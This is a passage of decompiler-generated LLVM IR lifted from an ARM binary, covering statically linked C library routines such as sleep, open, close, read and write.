  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_148f8

dec_label_pc_148f8:                               ; preds = %bb28, %dec_label_pc_148e0
  %v0_148fc = phi i32 [ %v0_148d4, %bb28 ], [ -1, %dec_label_pc_148e0 ]
  %v3_148f8 = icmp eq i32 %v0_148fc, -1
  store i32 %v0_148fc, i32* %r5.global-to-local, align 4
  br i1 %v3_148f8, label %dec_label_pc_14904, label %dec_label_pc_1494c

dec_label_pc_14904:                               ; preds = %dec_label_pc_148f8
  %v0_14908 = call i32 @__aeabi_read_tp()
  store i32 %v0_14908, i32* %r0.global-to-local, align 4
  %v3_1490c = load i16, i16* @global_var_22294.357, align 2
  %v4_1490c = sext i16 %v3_1490c to i32
  %v2_14910 = add i32 %v4_1490c, %v0_14908
  %v3_14910 = inttoptr i32 %v2_14910 to i32*
  %v4_14910 = load i32, i32* %v3_14910, align 4
  %v7_14914 = icmp eq i32 %v4_14910, 38
  br i1 %v7_14914, label %dec_label_pc_14920, label %dec_label_pc_14904.dec_label_pc_1494c_crit_edge

dec_label_pc_14904.dec_label_pc_1494c_crit_edge:  ; preds = %dec_label_pc_14904
  %v0_1494c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1494c

dec_label_pc_14920:                               ; preds = %dec_label_pc_14904
  %v0_14920 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14920, i32* %r0.global-to-local, align 4
  %tmp32 = icmp ugt i32 %v0_14920, -4096
  br i1 %tmp32, label %bb29, label %.thread22

bb29:                                             ; preds = %dec_label_pc_14920
  %v5_14938 = sub i32 0, %v0_14920
  store i32 %v5_14938, i32* %r2.global-to-local, align 4
  %v7_1493c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_14944.539 to i32), i32 55632) to i32*), align 4
  %v4_14940 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v4_14940, i32* %r0.global-to-local, align 4
  %v7_14944 = add i32 %v7_1493c, %v0_14908
  %v8_14944 = inttoptr i32 %v7_14944 to i32*
  store i32 %v5_14938, i32* %v8_14944, align 4
  %v0_14948.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_14920, %bb29
  %v0_14948 = phi i32 [ %v0_14948.pre, %bb29 ], [ %v0_14920, %dec_label_pc_14920 ]
  store i32 %v0_14948, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1494c

dec_label_pc_1494c:                               ; preds = %dec_label_pc_14904.dec_label_pc_1494c_crit_edge, %dec_label_pc_148f8, %.thread22
  %v0_1494c = phi i32 [ %v0_1494c.pre, %dec_label_pc_14904.dec_label_pc_1494c_crit_edge ], [ %v0_148fc, %dec_label_pc_148f8 ], [ %v0_14948, %.thread22 ]
  store i32 %v0_1494c, i32* %r0.global-to-local, align 4
  %v2_14950 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_14950, i32* @r4, align 4
  ret i32 %v0_1494c

; uselistorder directives
  uselistorder i32 %v0_1494c, { 1, 0 }
  uselistorder i32 %v0_14920, { 1, 2, 0, 3 }
  uselistorder i32 %v0_148d4, { 2, 0, 1 }
  uselistorder i32 %v3_1488c, { 2, 1, 0, 5, 4, 3, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 38, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 -1060, { 1, 0 }
  uselistorder i32 -1064, { 1, 0 }
  uselistorder label %dec_label_pc_1494c, { 2, 0, 1 }
  uselistorder label %.thread22, { 1, 0 }
  uselistorder label %dec_label_pc_148f8, { 1, 0 }
  uselistorder label %bb28, { 3, 0, 1, 2 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_14964 = load i32, i32* @r4, align 4
  %v6_14964 = load i32, i32* @r5, align 4
  %v9_14964 = load i32, i32* @r6, align 4
  %v12_14964 = load i32, i32* @r7, align 4
  %v15_14964 = load i32, i32* @lr, align 4
  store i32 0, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14974 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* @r7, align 4
  store i32 %arg1, i32* %stack_var_-32, align 4
  br i1 %v2_14974, label %dec_label_pc_14988, label %dec_label_pc_149fc

dec_label_pc_14988:                               ; preds = %entry
  %v0_14988 = call i32 @__aeabi_read_tp()
  %v1_1498c = add i32 %v0_14988, -1036
  %v2_1498c = inttoptr i32 %v1_1498c to i32*
  %v3_1498c = load i32, i32* %v2_1498c, align 4
  %v1_14990 = and i32 %v3_1498c, -71
  %v2_14994 = icmp ugt i32 %v1_14990, 7
  store i1 %v2_14994, i1* %cpsr_c.global-to-local, align 1
  %v7_14994 = icmp eq i32 %v1_14990, 8
  %v1_14998 = add i32 %v0_14988, -1168
  store i32 %v1_14998, i32* @r5, align 4
  br i1 %v7_14994, label %dec_label_pc_149a0, label %dec_label_pc_14a74

dec_label_pc_149a0:                               ; preds = %dec_label_pc_14988
  %v2_149a4 = add i32 %v0_14988, -624
  %v3_149a4 = inttoptr i32 %v2_149a4 to i32*
  store i32 -1, i32* %v3_149a4, align 4
  %v0_149a8 = load i32, i32* @r5, align 4
  %v1_149a8 = add i32 %v0_149a8, 132
  store i32 %v1_149a8, i32* @r6, align 4
  br label %dec_label_pc_149ac

dec_label_pc_149ac:                               ; preds = %dec_label_pc_149e0.dec_label_pc_149ac_crit_edge, %dec_label_pc_149a0
  %v0_149b0 = phi i32 [ %v0_149b0.pre, %dec_label_pc_149e0.dec_label_pc_149ac_crit_edge ], [ %v1_149a8, %dec_label_pc_149a0 ]
  %v0_149ac = phi i32 [ %v0_149e8, %dec_label_pc_149e0.dec_label_pc_149ac_crit_edge ], [ %v0_149a8, %dec_label_pc_149a0 ]
  %v1_149ac = add i32 %v0_149ac, 132
  %v2_149ac = inttoptr i32 %v1_149ac to i32*
  %v3_149ac = load i32, i32* %v2_149ac, align 4
  store i32 %v0_149b0, i32* %r2.global-to-local, align 4
  store i32 %v3_149ac, i32* @r4, align 4
  %v1_149bc30 = inttoptr i32 %v0_149b0 to i32*
  %v2_149bc31 = load i32, i32* %v1_149bc30, align 4
  %v3_149c033 = icmp uge i32 %v2_149bc31, %v3_149ac
  store i1 %v3_149c033, i1* %cpsr_c.global-to-local, align 1
  %v9_149c039 = icmp eq i32 %v2_149bc31, %v3_149ac
  br i1 %v9_149c039, label %dec_label_pc_149c8, label %dec_label_pc_149e0

dec_label_pc_149c8:                               ; preds = %dec_label_pc_149ac, %dec_label_pc_149c8.dec_label_pc_149bc_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_149d8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_149d8, label %dec_label_pc_149dc, label %dec_label_pc_149c8.dec_label_pc_149bc_crit_edge

dec_label_pc_149c8.dec_label_pc_149bc_crit_edge:  ; preds = %dec_label_pc_149c8
  %v0_149bc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_149c0.pre = load i32, i32* @r4, align 4
  %v1_149bc = inttoptr i32 %v0_149bc.pre to i32*
  %v2_149bc = load i32, i32* %v1_149bc, align 4
  %v3_149c0 = icmp uge i32 %v2_149bc, %v1_149c0.pre
  store i1 %v3_149c0, i1* %cpsr_c.global-to-local, align 1
  %v9_149c0 = icmp eq i32 %v2_149bc, %v1_149c0.pre
  br i1 %v9_149c0, label %dec_label_pc_149c8, label %dec_label_pc_149e0

dec_label_pc_149dc:                               ; preds = %dec_label_pc_149c8
  %v0_149dc = load i32, i32* @r4, align 4
  br label %dec_label_pc_149e0

dec_label_pc_149e0:                               ; preds = %dec_label_pc_149ac, %dec_label_pc_149c8.dec_label_pc_149bc_crit_edge, %dec_label_pc_149dc
  %v0_149e0 = phi i32 [ %v0_149dc, %dec_label_pc_149dc ], [ %v2_149bc31, %dec_label_pc_149ac ], [ %v2_149bc, %dec_label_pc_149c8.dec_label_pc_149bc_crit_edge ]
  %v1_149e0 = phi i32 [ %v0_149dc, %dec_label_pc_149dc ], [ %v3_149ac, %dec_label_pc_149ac ], [ %v1_149c0.pre, %dec_label_pc_149c8.dec_label_pc_149bc_crit_edge ]
  %v3_149e0 = icmp uge i32 %v0_149e0, %v1_149e0
  store i1 %v3_149e0, i1* %cpsr_c.global-to-local, align 1
  %v9_149e0 = icmp eq i32 %v0_149e0, %v1_149e0
  br i1 %v9_149e0, label %dec_label_pc_149e8, label %dec_label_pc_149e0.dec_label_pc_149ac_crit_edge

dec_label_pc_149e0.dec_label_pc_149ac_crit_edge:  ; preds = %dec_label_pc_149e0
  %v0_149e8 = load i32, i32* @r5, align 4
  %v0_149b0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_149ac

dec_label_pc_149e8:                               ; preds = %dec_label_pc_149e0
  %v0_149f0 = load i32, i32* @r7, align 4
  %v2_149f0 = add i32 %v0_149f0, 116
  %v3_149f0 = inttoptr i32 %v2_149f0 to i32*
  %v4_149f0 = load i32, i32* %v3_149f0, align 4
  store i32 84476, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_149f0)
  %v0_14a04.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_149fc

dec_label_pc_149fc:                               ; preds = %entry, %dec_label_pc_149e8
  %v0_14a04 = phi i32 [ 0, %entry ], [ %v0_14a04.pre, %dec_label_pc_149e8 ]
  %v2_14a08 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_14a08, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10000.57 to i32), i32* %stack_var_-40, align 4
  %v3_14a14 = call i32 @__libc_sigaction(i32 17, i32 %v0_14a04, i32 %v2_14a08)
  %v3_14a18 = load i32, i32* %stack_var_-60, align 4
  %v2_14a1c = icmp ne i32 %v3_14a18, 0
  store i1 %v2_14a1c, i1* %cpsr_c.global-to-local, align 1
  %v7_14a1c = icmp eq i32 %v3_14a18, 1
  br i1 %v7_14a1c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_149fc
  %v3_14a20 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_14a20, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_149fc, %bb
  call void @__pseudo_cond_branch(i1 %v7_14a1c, i32 ptrtoint (i32* @global_var_11684.543 to i32))
  %v2_14a30 = ptrtoint i32* %stack_var_-32 to i32
  %v2_14a38 = call i32 @__libc_nanosleep(i32 %v2_14a30, i32 %v2_14a30)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14a3c = icmp eq i32 %v2_14a38, 0
  br i1 %v2_14a3c, label %bb26, label %bb25

bb25:                                             ; preds = %.thread1
  store i32 0, i32* @r1, align 4
  store i32 499999999, i32* %r2.global-to-local, align 4
  %v3_14a50 = load i32, i32* %stack_var_-32, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br label %bb26

bb26:                                             ; preds = %.thread1, %bb25
  %storemerge = phi i32 [ %v3_14a50, %bb25 ], [ 0, %.thread1 ]
  store i32 %storemerge, i32* @r4, align 4
  %v3_14a60 = load i32, i32* %stack_var_-40, align 4
  %v1_14a64 = and i32 %v3_14a60, ptrtoint (i32* @global_var_10000.57 to i32)
  store i32 %v1_14a64, i32* %r2.global-to-local, align 4
  %v2_14a64 = icmp eq i32 %v1_14a64, 0
  br i1 %v2_14a64, label %bb27, label %.thread5

bb27:                                             ; preds = %bb26
  %v3_14a6c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_14a6c, i32* @r1, align 4
  br label %.thread5

.thread5:                                         ; preds = %bb26, %bb27
  call void @__pseudo_cond_branch(i1 %v2_14a64, i32 ptrtoint (i32* @global_var_11684.543 to i32))
  br label %dec_label_pc_14a74

dec_label_pc_14a74:                               ; preds = %dec_label_pc_14988, %.thread5
  %v0_14a74 = load i32, i32* @r4, align 4
  store i32 %v3_14964, i32* @r4, align 4
  store i32 %v6_14964, i32* @r5, align 4
  store i32 %v9_14964, i32* @r6, align 4
  store i32 %v12_14964, i32* @r7, align 4
  store i32 %v15_14964, i32* @lr, align 4
  ret i32 %v0_14a74

; uselistorder directives
  uselistorder i32 %v0_149dc, { 1, 0 }
  uselistorder i32 %v1_149c0.pre, { 0, 2, 1 }
  uselistorder i32* %stack_var_-40, { 2, 0, 3, 1 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 5, 6 }
  uselistorder i32 (i32, i32, i32)* @__libc_sigaction, { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_10000.57 to i32), { 4, 0, 1, 2, 5, 6, 7, 8, 3 }
  uselistorder label %dec_label_pc_14a74, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_149fc, { 1, 0 }
  uselistorder label %dec_label_pc_149e0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_149c8, { 1, 0 }
}

define i32 @function_14a88(i32 %arg1) local_unnamed_addr {
dec_label_pc_14a88:
  %v0_14a88 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14a88, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14a88
  %v2_14a88 = load i32, i32* @r4, align 4
  %v4_14a88 = lshr i32 %v2_14a88, %arg1
  %v5_14a88 = sub i32 32, %arg1
  %v6_14a88 = shl i32 %v2_14a88, %v5_14a88
  %v7_14a88 = or i32 %v6_14a88, %v4_14a88
  %v9_14a88 = and i32 %v7_14a88, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14a88, %bb
  %v4_14a90 = phi i32 [ %arg1, %dec_label_pc_14a88 ], [ %v9_14a88, %bb ]
  ret i32 %v4_14a90

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI___close_nocancel() local_unnamed_addr {
entry:
  %v0_14aa4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_14aa4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_14aa4 = load i32, i32* @r0, align 4
  ret i32 %v2_14aa4

bb1:                                              ; preds = %entry
  %v0_14aa8 = call i32 @__syscall_error()
  ret i32 %v0_14aa8
}

define i32 @__GI___libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14ab4 = load i32, i32* @global_var_25454.546, align 4
  %v2_14ab8 = icmp eq i32 %v3_14ab4, 0
  store i1 %v2_14ab8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14ab8, label %dec_label_pc_14ac0, label %entry.dec_label_pc_14adc_crit_edge

entry.dec_label_pc_14adc_crit_edge:               ; preds = %entry
  %v3_14adc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_14adc

dec_label_pc_14ac0:                               ; preds = %entry
  %v0_14ac0 = load i32, i32* @r7, align 4
  store i32 %v0_14ac0, i32* @ip, align 4
  %v0_14ad0 = load i32, i32* @r0, align 4
  %v2_14ad0 = icmp ugt i32 %v0_14ad0, -4097
  %v7_14ad0 = icmp eq i32 %v0_14ad0, -4096
  store i1 %v7_14ad0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14ad0, label %bb7, label %bb

bb:                                               ; preds = %bb9, %bb8, %dec_label_pc_14adc, %dec_label_pc_14ac0
  %merge = phi i32 [ %v0_14ad0, %dec_label_pc_14ac0 ], [ %v0_14b00, %dec_label_pc_14adc ], [ %v0_14b10, %bb8 ], [ %v6_14b20, %bb9 ]
  ret i32 %merge

bb7:                                              ; preds = %dec_label_pc_14ac0
  %v0_14ad8 = call i32 @__syscall_error()
  br label %dec_label_pc_14adc

dec_label_pc_14adc:                               ; preds = %entry.dec_label_pc_14adc_crit_edge, %bb7
  %v3_14adc = phi i32 [ %v3_14adc.pre, %entry.dec_label_pc_14adc_crit_edge ], [ %v0_14ad8, %bb7 ]
  %v9_14adc = load i32, i32* @r7, align 4
  store i32 %v9_14adc, i32* %stack_var_-8, align 4
  %v12_14adc = load i32, i32* @lr, align 4
  %v0_14ae0 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_14ae0, i32* @ip, align 4
  store i32 %v3_14adc, i32* @r7, align 4
  %v1_14afc = call i32 @__libc_disable_asynccancel(i32 %v0_14ae0)
  %v0_14b00 = load i32, i32* @r7, align 4
  store i32 %v0_14b00, i32* @r0, align 4
  %v2_14b04 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14b04, i32* @r7, align 4
  store i32 %v12_14adc, i32* @lr, align 4
  %v2_14b08 = icmp ugt i32 %v0_14b00, -4097
  %v7_14b08 = icmp eq i32 %v0_14b00, -4096
  store i1 %v7_14b08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14b08, label %bb8, label %bb

bb8:                                              ; preds = %dec_label_pc_14adc
  %v0_14b10 = call i32 @__syscall_error()
  %v0_14b20 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14b20, label %bb9, label %bb

bb9:                                              ; preds = %bb8
  %v1_14b20 = load i32, i32* @r1, align 4
  %v2_14b20 = load i32, i32* @r8, align 4
  %v5_14b20 = mul i32 %v2_14b20, 262144
  %v6_14b20 = and i32 %v5_14b20, %v1_14b20
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_14b00, { 0, 2, 3, 1 }
  uselistorder i32 %v0_14ad0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14adc, { 1, 0 }
}

define i32 @__GI___open_nocancel() local_unnamed_addr {
entry:
  %v0_14b34 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_14b34, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_14b34 = load i32, i32* @r0, align 4
  ret i32 %v2_14b34

bb1:                                              ; preds = %entry
  %v0_14b38 = call i32 @__syscall_error()
  ret i32 %v0_14b38
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_14b44 = load i32, i32* @global_var_25454.546, align 4
  %v2_14b48 = icmp eq i32 %v3_14b44, 0
  store i1 %v2_14b48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14b48, label %dec_label_pc_14b50, label %entry.dec_label_pc_14b6c_crit_edge

entry.dec_label_pc_14b6c_crit_edge:               ; preds = %entry
  %v3_14b6c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_14b6c

dec_label_pc_14b50:                               ; preds = %entry
  %v0_14b60 = load i32, i32* @r0, align 4
  %v2_14b60 = icmp ugt i32 %v0_14b60, -4097
  %v7_14b60 = icmp eq i32 %v0_14b60, -4096
  store i1 %v7_14b60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14b60, label %bb9, label %bb

bb:                                               ; preds = %bb11, %bb10, %dec_label_pc_14b6c, %dec_label_pc_14b50
  %merge = phi i32 [ %v0_14b60, %dec_label_pc_14b50 ], [ %v0_14b90, %dec_label_pc_14b6c ], [ %v0_14ba0, %bb10 ], [ %v9_14bb0, %bb11 ]
  ret i32 %merge

bb9:                                              ; preds = %dec_label_pc_14b50
  %v0_14b68 = call i32 @__syscall_error()
  br label %dec_label_pc_14b6c

dec_label_pc_14b6c:                               ; preds = %entry.dec_label_pc_14b6c_crit_edge, %bb9
  %v3_14b6c = phi i32 [ %v3_14b6c.pre, %entry.dec_label_pc_14b6c_crit_edge ], [ %v0_14b68, %bb9 ]
  store i32 %v3_14b6c, i32* %stack_var_-24, align 4
  %v9_14b6c = load i32, i32* @r2, align 4
  %v12_14b6c = load i32, i32* @r3, align 4
  %v15_14b6c = load i32, i32* @r7, align 4
  store i32 %v15_14b6c, i32* %stack_var_-8, align 4
  %v18_14b6c = load i32, i32* @lr, align 4
  %v0_14b70 = call i32 @__libc_enable_asynccancel()
  %v2_14b78 = load i32, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %v9_14b6c, i32* @r2, align 4
  store i32 %v12_14b6c, i32* @r3, align 4
  store i32 %v2_14b78, i32* @r7, align 4
  %v1_14b8c = call i32 @__libc_disable_asynccancel(i32 %v0_14b70)
  %v0_14b90 = load i32, i32* @r7, align 4
  store i32 %v0_14b90, i32* @r0, align 4
  %v2_14b94 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14b94, i32* @r7, align 4
  store i32 %v18_14b6c, i32* @lr, align 4
  %v2_14b98 = icmp ugt i32 %v0_14b90, -4097
  %v7_14b98 = icmp eq i32 %v0_14b90, -4096
  store i1 %v7_14b98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14b98, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_14b6c
  %v0_14ba0 = call i32 @__syscall_error()
  %v0_14bb0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14bb0, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  %v1_14bb0 = load i32, i32* @r1, align 4
  %v2_14bb0 = load i32, i32* @r8, align 4
  %v5_14bb0 = sub i32 32, %v2_14bb0
  %v6_14bb0 = shl i32 %v2_14bb0, %v5_14bb0
  %v9_14bb0 = and i32 %v6_14bb0, %v1_14bb0
  br label %bb

; uselistorder directives
  uselistorder i32 %v2_14bb0, { 1, 0 }
  uselistorder i32 %v0_14b90, { 0, 2, 3, 1 }
  uselistorder i32 %v0_14b60, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14b6c, { 1, 0 }
}

define i32 @__GI___write_nocancel() local_unnamed_addr {
entry:
  %v0_14bc4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_14bc4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_14bc4 = load i32, i32* @r0, align 4
  ret i32 %v2_14bc4

bb1:                                              ; preds = %entry
  %v0_14bc8 = call i32 @__syscall_error()
  ret i32 %v0_14bc8
}

define i32 @__GI___libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14bd4 = load i32, i32* @global_var_25454.546, align 4
  %v2_14bd8 = icmp eq i32 %v3_14bd4, 0
  store i1 %v2_14bd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14bd8, label %dec_label_pc_14be0, label %entry.dec_label_pc_14bfc_crit_edge

entry.dec_label_pc_14bfc_crit_edge:               ; preds = %entry
  %v3_14bfc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_14bfc

dec_label_pc_14be0:                               ; preds = %entry
  %v0_14bf0 = load i32, i32* @r0, align 4
  %v2_14bf0 = icmp ugt i32 %v0_14bf0, -4097
  %v7_14bf0 = icmp eq i32 %v0_14bf0, -4096
  store i1 %v7_14bf0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14bf0, label %bb9, label %bb

bb:                                               ; preds = %bb11, %bb10, %dec_label_pc_14bfc, %dec_label_pc_14be0
  %merge = phi i32 [ %v0_14bf0, %dec_label_pc_14be0 ], [ %v0_14c20, %dec_label_pc_14bfc ], [ %v0_14c30, %bb10 ], [ %v8_14c40, %bb11 ]
  ret i32 %merge

bb9:                                              ; preds = %dec_label_pc_14be0
  %v0_14bf8 = call i32 @__syscall_error()
  br label %dec_label_pc_14bfc

dec_label_pc_14bfc:                               ; preds = %entry.dec_label_pc_14bfc_crit_edge, %bb9
  %v3_14bfc = phi i32 [ %v3_14bfc.pre, %entry.dec_label_pc_14bfc_crit_edge ], [ %v0_14bf8, %bb9 ]
  %v12_14bfc = load i32, i32* @r3, align 4
  %v15_14bfc = load i32, i32* @r7, align 4
  store i32 %v15_14bfc, i32* %stack_var_-8, align 4
  %v18_14bfc = load i32, i32* @lr, align 4
  %v0_14c00 = call i32 @__libc_enable_asynccancel()
  store i32 %arg2, i32* @r1, align 4
  store i32 %v12_14bfc, i32* @r3, align 4
  store i32 %v3_14bfc, i32* @r7, align 4
  %v1_14c1c = call i32 @__libc_disable_asynccancel(i32 %v0_14c00)
  %v0_14c20 = load i32, i32* @r7, align 4
  store i32 %v0_14c20, i32* @r0, align 4
  %v2_14c24 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14c24, i32* @r7, align 4
  store i32 %v18_14bfc, i32* @lr, align 4
  %v2_14c28 = icmp ugt i32 %v0_14c20, -4097
  %v7_14c28 = icmp eq i32 %v0_14c20, -4096
  store i1 %v7_14c28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14c28, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_14bfc
  %v0_14c30 = call i32 @__syscall_error()
  %v0_14c40 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14c40, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  %v1_14c40 = load i32, i32* @r1, align 4
  %v2_14c40 = load i32, i32* @r8, align 4
  %v3_14c40 = udiv i32 %v2_14c40, 32768
  %v4_14c40 = mul i32 %v2_14c40, 131072
  %v5_14c40 = or i32 %v3_14c40, %v4_14c40
  %v8_14c40 = and i32 %v5_14c40, %v1_14c40
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_14c20, { 0, 2, 3, 1 }
  uselistorder i32 %v0_14bf0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14bfc, { 1, 0 }
}

define i32 @__read_nocancel() local_unnamed_addr {
entry:
  %v0_14c54 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_14c54, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_14c54 = load i32, i32* @r0, align 4
  ret i32 %v2_14c54

bb1:                                              ; preds = %entry
  %v0_14c58 = call i32 @__syscall_error()
  ret i32 %v0_14c58

; uselistorder directives
  uselistorder i1* @cpsr_c, { 1, 2, 3, 4, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14c64 = load i32, i32* @global_var_25454.546, align 4
  %v2_14c68 = icmp eq i32 %v3_14c64, 0
  br i1 %v2_14c68, label %dec_label_pc_14c70, label %entry.dec_label_pc_14c8c_crit_edge

entry.dec_label_pc_14c8c_crit_edge:               ; preds = %entry
  %v3_14c8c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_14c8c

dec_label_pc_14c70:                               ; preds = %entry
  %v0_14c80 = load i32, i32* @r0, align 4
  %v2_14c80 = icmp ugt i32 %v0_14c80, -4097
  br i1 %v2_14c80, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_14c8c, %dec_label_pc_14c70
  %merge = phi i32 [ %v0_14c80, %dec_label_pc_14c70 ], [ %v0_14cb0, %dec_label_pc_14c8c ]
  ret i32 %merge

bb8:                                              ; preds = %dec_label_pc_14c70
  %v0_14c88 = call i32 @__syscall_error()
  br label %dec_label_pc_14c8c

dec_label_pc_14c8c:                               ; preds = %entry.dec_label_pc_14c8c_crit_edge, %bb8
  %v3_14c8c = phi i32 [ %v3_14c8c.pre, %entry.dec_label_pc_14c8c_crit_edge ], [ %v0_14c88, %bb8 ]
  %v6_14c8c = load i32, i32* @r1, align 4
  %v15_14c8c = load i32, i32* @r7, align 4
  store i32 %v15_14c8c, i32* %stack_var_-8, align 4
  %v18_14c8c = load i32, i32* @lr, align 4
  %v0_14c90 = call i32 @__libc_enable_asynccancel()
  store i32 %v6_14c8c, i32* @r1, align 4
  store i32 %v3_14c8c, i32* @r7, align 4
  %v1_14cac = call i32 @__libc_disable_asynccancel(i32 %v0_14c90)
  %v0_14cb0 = load i32, i32* @r7, align 4
  store i32 %v0_14cb0, i32* @r0, align 4
  %v2_14cb4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14cb4, i32* @r7, align 4
  store i32 %v18_14c8c, i32* @lr, align 4
  %v2_14cb8 = icmp ugt i32 %v0_14cb0, -4097
  br i1 %v2_14cb8, label %bb9, label %bb

bb9:                                              ; preds = %dec_label_pc_14c8c
  %v0_14cc0 = call i32 @__syscall_error()
  ret i32 %v0_14cc0

; uselistorder directives
  uselistorder i32 %v0_14cb0, { 1, 2, 0 }
  uselistorder i32 ()* @__syscall_error, { 5, 4, 11, 7, 6, 10, 1, 0, 9, 3, 2, 8 }
  uselistorder label %dec_label_pc_14c8c, { 1, 0 }
}

define i32 @__libc_disable_asynccancel(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_14cd0 = load i32, i32* %r0.global-to-local, align 4
  %v1_14cd0 = and i32 %v0_14cd0, 2
  %v2_14cd0 = icmp eq i32 %v1_14cd0, 0
  %v3_14cd4 = load i32, i32* @r4, align 4
